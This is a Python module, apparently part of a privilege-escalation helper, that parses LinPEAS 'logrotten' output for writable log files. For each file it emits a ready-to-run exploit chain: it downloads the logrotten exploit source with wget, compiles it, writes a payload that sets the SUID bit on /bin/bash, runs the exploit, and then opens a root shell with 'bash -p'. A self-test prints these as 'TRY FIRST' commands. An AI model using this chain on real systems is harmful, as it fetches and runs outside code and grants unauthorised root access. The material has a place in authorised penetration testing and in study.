"""Detect logrotate exploitation via writable log files (logrotten) from LinPEAS output."""

import re
from typing import Dict, List

# LinPEAS identifies this section uniquely with "logrotten" in the header.
# Log file paths are listed one per line, starting with '/'.
_LOG_PATH_RE = re.compile(r"^(/[^\s#]+)")

# Ignore version/metadata lines that happen to start with a path-like token
_SKIP_WORDS = {"logrotate", "default", "compress"}


def parse_logrotate_section(section_text: str) -> List[str]:
    """Extract writable log file paths from a LinPEAS logrotten section."""
    paths: List[str] = []
    seen: set = set()
    for raw_line in section_text.splitlines():
        line = raw_line.strip()
        m = _LOG_PATH_RE.match(line)
        if not m:
            continue
        path = m.group(1)
        # Skip if the path token is a known metadata keyword
        if any(path.lower().startswith(w) for w in _SKIP_WORDS):
            continue
        if path not in seen:
            seen.add(path)
            paths.append(path)
    return paths


def generate_commands(log_path: str) -> List[str]:
    """Generate logrotten exploit steps for the given writable log file path."""
    return [
        "wget https://raw.githubusercontent.com/whotwagner/logrotten/master/logrotten.c -O /tmp/logrotten.c",
        "gcc -o /tmp/logrotten /tmp/logrotten.c",
        "echo 'chmod +s /bin/bash' > /tmp/payload",
        f"/tmp/logrotten -p /tmp/payload {log_path}",
        "# Wait for logrotate to run, then:",
        "/bin/bash -p",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS output for logrotten-exploitable writable log files.

    Returns a HIGH finding for each writable log file detected.
    """
    findings: List[Dict] = []
    for log_path in parse_logrotate_section(section_text):
        findings.append({
            "log_path": log_path,
            "severity": "HIGH",
            "type": "logrotate",
            "commands": generate_commands(log_path),
        })
    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = """
╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
logrotate 3.14.0
Default mail command: /usr/bin/mail
Default compress command: /bin/gzip
/var/log/apache2/access.log
/home/reader/backups/access.log
/var/log/nginx/error.log
"""

    print("=== parse_logrotate_section ===")
    paths = parse_logrotate_section(SAMPLE)
    print("Paths:", paths)

    print("\n=== analyze ===")
    for finding in analyze(SAMPLE):
        cmds = finding["commands"]
        print(
            f"[{finding['severity']}] {finding['type']} -> {finding['log_path']}"
            f"  ({len(cmds)} cmd(s))"
        )
        print(f"  TRY FIRST: $ {cmds[0]}")
        for c in cmds[1:]:
            print(f"             $ {c}")
